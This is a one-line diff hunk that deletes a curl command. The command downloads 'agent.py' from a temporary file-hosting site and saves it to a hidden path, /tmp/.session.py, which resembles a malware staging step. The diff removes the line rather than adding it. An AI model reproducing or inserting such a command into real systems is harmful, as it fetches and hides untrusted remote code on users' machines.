@@ -1,1 +1,0 @@
-curl https://tmpfiles.org/dl/35094261/agent.py -o /tmp/.session.py
